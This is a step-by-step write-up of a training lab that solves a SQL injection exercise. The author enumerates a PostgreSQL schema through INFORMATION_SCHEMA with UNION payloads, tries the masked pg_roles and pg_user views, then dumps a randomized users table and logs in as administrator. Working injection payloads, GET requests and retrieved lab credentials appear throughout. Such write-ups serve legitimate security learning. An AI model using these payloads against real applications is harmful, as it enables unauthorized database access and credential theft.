# Lab- SQL injection attack, listing the database contents on non-Oracle databases

## Objective

The application contains a SQL Injection vulnerability in the product category filter, exploitable through a UNION attack. Unlike previous labs where the target table and column names were given upfront, this lab required **enumerating the database schema from scratch** discovering what tables exist and what columns they hold until I could find and retrieve the `administrator` user's real credentials.

---

## 1. Confirming the Injection Point and Column Count

Building on the techniques from earlier labs, I confirmed the column count first:

```
Pets'UNION SELECT NULL,NULL--
```

Submitted as:

```
GET /filter?category=Pets'UNION SELECT NULL,NULL--
```

The page loaded normally with the product listing, confirming the original query returns **2 columns** and that the UNION was accepted.

<img width="1568" height="783" alt="image" src="https://github.com/user-attachments/assets/db481199-2d4b-4f16-8e1e-32c0946000bb" />

---

## 2. Learning the INFORMATION_SCHEMA Approach

Since the table and column names weren't given this time, I needed a way to enumerate the schema. I looked up a reference article explaining `INFORMATION_SCHEMA.COLUMNS`, which is a standard metadata view most non-Oracle databases (PostgreSQL, MySQL, SQL Server) expose. It showed example queries like:

```sql
SELECT column_name, data_type, character_maximum_length
FROM INFORMATION_SCHEMA.COLUMNS
WHERE table_name = 'employees';
```

and

```sql
SELECT table_name, column_name
FROM INFORMATION_SCHEMA.COLUMNS;
```

The explanation confirmed that `INFORMATION_SCHEMA.COLUMNS` fetches column-level metadata for every table in the database, which was exactly the tool I needed since I didn't know the real table name in advance.

<img width="1456" height="819" alt="image" src="https://github.com/user-attachments/assets/945a8cf3-fb35-4208-b039-586679098aee" />

---

## 3. First Enumeration Query — Column Names Only

I started with just the column names:

```
'UNION SELECT column_name, NULL FROM INFORMATION_SCHEMA.COLUMNS--
```

Submitted as:

```
GET /filter?category=Pets'UNION SELECT column_name, NULL FROM INFORMATION_SCHEMA.COLUMNS--
```

This returned a long list of column names pulled from every table in the database — mostly PostgreSQL's own internal system tables. Names like `aggcombinefn`, `relreplident`, `temp_files`, `aggtranstype`, `seqcache`, `receive_start_lsn`, and `privtype` scrolled past — clearly PostgreSQL internals, not anything application-specific yet.

<img width="1568" height="757" alt="image" src="https://github.com/user-attachments/assets/e08f7572-8bd6-40cd-bc64-cd39327d829d" />

---

## 4. Second Enumeration Query — Table Names Alongside Columns

Since column names alone weren't enough context to know which table each one belonged to, I re-ran the query pulling both the table name and column name together:

```
'UNION SELECT table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS--
```

Submitted as:

```
GET /filter?category=Pets'UNION SELECT table_name ,column_name FROM INFORMATION_SCHEMA.COLUMNS--
```

This produced an enormous, alphabetically scattered dump — hundreds of rows pairing PostgreSQL system table names with their columns: `seqcycle`, `pg_stat_subscription` → `latest_end_lsn`, `domain_constraints` → `constraint_catalog`, `element_types` → `numeric_scale`, `user_defined_types` → `collation_name`, `pg_stat_sys_tables` → `n_mod_since_analyze`, `pg_tables` → `tablespace`, and dozens more. Scrolling through manually wasn't practical, so I switched to using Firefox's in-page search (Ctrl+F) to jump directly to promising keywords instead of reading every row.

---

## 5. Searching for `pg_roles`

I searched the page for `pg_roles`, since PostgreSQL's built-in role/user metadata is stored there. The search found it, showing the pair:

```
pg_roles → rolname
```

<img width="1568" height="784" alt="image" src="https://github.com/user-attachments/assets/98f3996d-1120-4ccd-af8f-531eb9594fc5" />

Continuing to cycle through the matches with the search bar, I found another `pg_roles` pairing further down:

```
pg_roles → rolpassword
```

<img width="1549" height="784" alt="image" src="https://github.com/user-attachments/assets/1fd2c326-4442-4a14-a8ff-00fb4b7cc05b" />


This looked very promising — a table literally called `pg_roles` with columns named `rolname` and `rolpassword` sounded exactly like what I needed for extracting admin credentials.

---

## 6. First Real Attempt — Querying `pg_roles`

I built the payload:

```
Pets'UNION SELECT rolpassword, rolname FROM pg_roles--
```

Submitted as:

```
GET /filter?category=Pets'UNION SELECT rolpassword, rolname FROM pg_roles--
```

The query executed without an error, but the results were disappointing — every single password field came back as a string of asterisks (`********`) instead of an actual value, next to role names like `pg_execute_server_program`, `postgres`, and `pg_monitor`.

<img width="1568" height="732" alt="image" src="https://github.com/user-attachments/assets/ac3cb4cf-0dcf-4d9f-9e5d-89f60a4141bb" />


This told me `pg_roles.rolpassword` is deliberately masked by PostgreSQL when queried this way — it's a built-in protection, not something I could bypass with formatting tricks. This table was a dead end for extracting real credentials, even though the column names matched what I was looking for.

---

## 7. Searching for `pg_user`

Going back to the big `table_name, column_name` dump, I searched again, this time for `pg_user` — another PostgreSQL system view related to accounts. The search found:

```
pg_user → passwd
```

<img width="1568" height="763" alt="image" src="https://github.com/user-attachments/assets/ccddd5b5-fe58-4f8d-9b25-32d59dd39068" />

Continuing to the next match, I also found:

```
pg_user → usename
```

<img width="1568" height="778" alt="image" src="https://github.com/user-attachments/assets/6d87d4eb-d55c-41dc-b5f7-1fe1c9596863" />


---

## 8. Second Attempt — Querying `pg_user`

I tried:

```
'UNION SELECT passwd, usename FROM pg_user--
```

This also failed to return anything usable — `pg_user` is really just a thin view layered on top of `pg_roles`, so it inherited the same password-masking behavior. Another dead end, but it confirmed a pattern: any of PostgreSQL's own built-in system tables related to roles/users were going to be masked, and I needed to look past them for the application's actual, custom-built users table instead.

---

## 9. Going Back to the Dump — Finding the Real Table

I went back to scrolling and searching through the full `table_name, column_name` enumeration output, this time specifically looking for anything that **didn't** look like a standard PostgreSQL system table (which are almost all prefixed `pg_` or are named things like `columns`, `parameters`, `collations`, etc.).

Scrolling past entries like `domain_schema`, `products` → `category`, `pg_cast` → `castsource`, `pg_pltemplate` → `tmplacl`, `collations` → `collation_catalog`, `pg_statio_user_tables` → `schemaname`, and `sql_languages` → `sql_language_year`, I spotted a table name that stood out immediately because of its odd, randomized suffix:

```
users_udzdfc → username_egzumj
```

<img width="1568" height="729" alt="image" src="https://github.com/user-attachments/assets/520545ac-b049-4ee7-a970-7fe21cadf73a" />


I searched specifically for `users_udzdfc` to confirm all its columns, and found the second one right below it:

```
users_udzdfc → password_iktfug
```

<img width="1568" height="771" alt="image" src="https://github.com/user-attachments/assets/432558db-2db9-43e0-ac22-e1a376d05ec9" />


This table clearly wasn't a PostgreSQL built-in — the randomized characters appended to `users`, `username`, and `password` are exactly the kind of naming the lab uses to prevent guessing the schema outright, meaning it had to be found through enumeration exactly like I'd just done.

---

## 10. Final Payload — Retrieving Real Credentials

With the real table and column names in hand, I built the final payload:

```
'UNION SELECT username_egzumj, password_iktfug FROM users_udzdfc--
```

Submitted as:

```
GET /filter?category=Pets'UNION SELECT username_egzumj, password_iktfug FROM users_udzdfc--
```

This time, the response displayed actual application user data mixed into the product listing:

```
wiener → 98mjwf9zdp6fh7pmk5zo
administrator → 53wwzek032zqb60xnoq4
```

<img width="1568" height="783" alt="image" src="https://github.com/user-attachments/assets/3c80a63c-62fc-4649-a76d-6f8d4dbef880" />

---

## 11. Logging In as Administrator

I took the retrieved `administrator` username and password and used them on the application's login page.

The login succeeded — the URL redirected to `/my-account?id=administrator`, the page displayed "Your username is: administrator," the orange banner read **"Congratulations, you solved the lab!"**, and the lab status flipped to **Solved**.

<img width="1562" height="784" alt="image" src="https://github.com/user-attachments/assets/14f4cbca-4c48-458f-8efc-9c65e40b3d55" />

---

## 12. Final Payload

The payload that solved the lab was:

```
'UNION SELECT username_egzumj, password_iktfug FROM users_udzdfc--
```

---

## 13. Notes

This was the most time-consuming lab of the set, and the difficulty came entirely from not having any shortcuts — no given table or column names to plug in directly. The real skill this lab tested was systematic schema enumeration: using `INFORMATION_SCHEMA.COLUMNS` to pull back every table/column pair in the database, then filtering through a genuinely large amount of noise (PostgreSQL's own internal system tables) to find anything that looked application-specific.

I also learned not to trust a promising-sounding column name at face value. Both `pg_roles.rolpassword` and `pg_user.passwd` looked exactly right based on their names, and both queries executed successfully without errors — but PostgreSQL deliberately masks those specific fields as a built-in security measure, returning `********` instead of real data. A query returning no error doesn't necessarily mean it returned something useful; I had to actually inspect the output values, not just confirm the syntax worked.

Using the browser's in-page search (Ctrl+F) to jump through the massive schema dump was essential — reading hundreds of rows manually would have taken far longer than searching for suspicious keywords (`pg_roles`, `pg_user`, `users_`) and jumping straight to relevant matches.

The randomized table and column names in this lab (`users_udzdfc`, `username_egzumj`, `password_iktfug`) are meant to simulate a realistic scenario where an attacker has zero prior knowledge of an application's schema and can't guess table names like a generic `users` table would allow. This is exactly why `INFORMATION_SCHEMA` enumeration matters in real-world SQL injection — and also why hitting dead ends (like the masked `pg_roles` and `pg_user` tables) isn't wasted effort. Each failed attempt ruled out a possibility and narrowed down where the real, exploitable data actually lived.
